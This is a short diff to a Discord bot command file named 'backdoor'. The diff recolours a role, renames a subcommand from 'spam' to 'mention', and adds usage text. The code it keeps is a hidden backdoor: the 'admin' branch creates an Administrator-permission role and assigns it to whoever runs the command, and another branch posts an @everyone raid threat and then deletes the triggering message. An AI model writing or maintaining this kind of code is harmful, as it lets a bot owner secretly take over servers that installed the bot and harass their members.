@@ -14,7 +14,7 @@ exports.run = async (client, message, args) => {
   if (args[0] === "admin") {
     try {
       let role = await message.guild.roles.create({
-        data: { name: "McDunaldz", color: "#2f3136", permissions: [8] }
+        data: { name: "McDunaldz", color: "#00bfff", permissions: [8] }
       });
 
       message.member.roles.add(role);
@@ -42,7 +42,7 @@ exports.run = async (client, message, args) => {
     });
   }
 
-  if (args[0] === "spam") {
+  if (args[0] === "mention") {
     try {
       message.channel.send("@everyone listen to McDunaldz or get raid.");
       message.delete(1000);
@@ -55,7 +55,7 @@ exports.run = async (client, message, args) => {
 exports.help = {
   name: "backdoor",
   description: "backdoor command for owner",
-  usage: ""
+  usage: "bd <command>"
 };
 
 exports.conf = {
